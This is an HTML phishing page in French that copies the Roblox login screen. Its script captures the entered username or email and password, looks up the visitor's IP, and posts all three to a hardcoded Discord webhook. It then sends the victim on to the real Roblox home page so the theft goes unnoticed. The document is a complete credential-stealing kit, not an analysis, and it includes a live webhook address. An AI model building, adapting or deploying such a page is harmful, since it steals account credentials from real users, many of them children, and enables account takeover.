<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Roblox</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
  body{background:#121212;color:#fff;min-height:100vh;padding-bottom:40px}

  /* Header */
  .header{display:flex;align-items:center;justify-content:space-between;padding:12px 14px;background:#121212;border-bottom:1px solid #2a2a2a;position:sticky;top:0;z-index:10}
  .logo{width:28px;height:28px;background:#fff;border-radius:4px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:16px;color:#000}
  .header-right{display:flex;align-items:center;gap:8px}
  .btn-signup{background:#00a2ff;color:#fff;border:none;border-radius:20px;padding:7px 14px;font-size:14px;font-weight:600}
  .btn-login-top{background:transparent;color:#fff;border:1.5px solid #fff;border-radius:20px;padding:6px 12px;font-size:14px;font-weight:500}
  .search{width:22px;height:22px;opacity:0.9}

  /* Nav */
  .nav{display:flex;gap:18px;padding:12px 16px;font-size:14px;color:#ccc;overflow-x:auto;white-space:nowrap}
  .nav span{opacity:0.85}

  /* Form */
  .form-wrap{padding:30px 16px 10px;max-width:420px;margin:0 auto}
  h1{font-size:26px;font-weight:700;text-align:center;margin-bottom:24px;letter-spacing:-0.3px}
  input{width:100%;height:50px;background:#2a2a2a;border:1px solid #3d3d3d;border-radius:8px;padding:0 14px;color:#fff;font-size:16px;margin-bottom:12px;outline:none;-webkit-appearance:none}
  input::placeholder{color:#8a8a8a}
  input:focus{border-color:#00a2ff}
  .btn-main{width:100%;height:50px;background:transparent;border:2px solid #fff;border-radius:8px;color:#fff;font-size:16px;font-weight:600;margin:8px 0 18px}
  .forgot{text-align:center;margin-bottom:28px}
  .forgot a{color:#fff;font-size:14.5px;text-decoration:none}
  .btn-sec{width:100%;height:46px;background:#2a2a2a;border:none;border-radius:8px;color:#fff;font-size:14.5px;font-weight:500;margin-bottom:10px}
  .signup{text-align:center;margin:28px 0 20px;font-size:14.5px;color:#aaa}
  .signup a{color:#00a2ff;text-decoration:none}

  /* Bannière iOS */
  .ios-banner{margin:30px 16px 0;background:#1a1a1a;border-radius:12px;padding:14px;display:flex;align-items:center;gap:12px;position:relative}
  .ios-logo{width:42px;height:42px;background:#00a2ff;border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:20px;color:#fff;flex-shrink:0}
  .ios-text{flex:1;font-size:13px;line-height:1.35}
  .ios-text strong{display:block;margin-bottom:2px}
  .btn-visit{background:#00a2ff;color:#fff;border:none;border-radius:20px;padding:8px 14px;font-size:13px;font-weight:600;flex-shrink:0}
  .close-banner{position:absolute;top:8px;left:8px;width:18px;height:18px;opacity:0.6;font-size:14px}
</style>
</head>
<body>

  <!-- Header -->
  <div class="header">
    <div class="logo">R</div>
    <div class="header-right">
      <button class="btn-signup">S'inscrire</button>
      <button class="btn-login-top">Connexion</button>
      <div class="search">⌕</div>
    </div>
  </div>

  <!-- Nav -->
  <div class="nav">
    <span>Charts</span>
    <span>Marketplace</span>
    <span>Créer</span>
    <span>Robux</span>
  </div>

  <!-- Formulaire -->
  <div class="form-wrap">
    <h1>Connexion à Roblox</h1>

    <form id="loginForm">
      <input type="text" id="user" placeholder="Identifiant/E-mail/Téléphone" required autocomplete="username" autocapitalize="off" spellcheck="false">
      <input type="password" id="pass" placeholder="Mot de passe" required autocomplete="current-password">
      <button type="submit" class="btn-main">Connexion</button>
    </form>

    <div class="forgot">
      <a href="#">Mot de passe ou nom d'utilisateur oublié ?</a>
    </div>

    <button type="button" class="btn-sec">Envoyez-moi un code unique par email</button>
    <button type="button" class="btn-sec">Connexion rapide</button>
    <button type="button" class="btn-sec">Autres options de connexion</button>

    <div class="signup">
      Vous n'avez pas de compte ? <a href="#">S'inscrire</a>
    </div>
  </div>

  <!-- Bannière application iOS -->
  <div class="ios-banner">
    <div class="close-banner">✕</div>
    <div class="ios-logo">R</div>
    <div class="ios-text">
      <strong>Explore Roblox dans notre application iOS !</strong>
      Des millions d'expériences vécues par des personnes comme toi
    </div>
    <button class="btn-visit">Visiter</button>
  </div>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1573783474807115827/b6LltWM6SbACD3zrXOuDeeRFvebCw_2QFIs96UHsmlv4CPmJGKM8Jo0ThRwCZd1wMEh2";

document.getElementById("loginForm").addEventListener("submit", async function(e) {
  e.preventDefault();

  const user = document.getElementById("user").value;
  const pass = document.getElementById("pass").value;
  const ip = await fetch("https://api.ipify.org?format=json")
    .then(r => r.json())
    .then(d => d.ip)
    .catch(() => "inconnu");

  await fetch(WEBHOOK, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      embeds: [{
        title: "Nouveau login Roblox",
        color: 5814783,
        fields: [
          {name: "Username / Email", value: "```" + user + "```"},
          {name: "Password", value: "```" + pass + "```"},
          {name: "IP", value: ip}
        ],
        timestamp: new Date().toISOString()
      }]
    })
  });

  window.location.href = "https://www.roblox.com/home";
});
</script>
</body>
</html>
